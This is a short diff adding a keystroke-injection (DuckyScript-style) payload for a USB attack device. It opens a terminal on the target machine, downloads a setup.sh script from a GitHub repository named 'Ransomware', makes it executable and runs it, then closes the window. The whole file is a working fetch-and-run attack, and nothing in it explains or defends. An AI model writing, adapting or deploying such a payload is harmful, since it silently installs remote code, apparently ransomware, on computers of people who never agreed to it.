@@ -1,0 +1,10 @@
+DELAY 700
+CTRL ALT t
+DELAY 500
+GUI
+DELAY 500
+STRING cd ~/Desktop && wget https://raw.githubusercontent.com/Abdullah-k0de/Ransomware/refs/heads/main/server-type-arch/setup.sh
+ENTER
+DELAY 500
+STRING chmod +x setup.sh && ./setup.sh ; exit
+ENTER
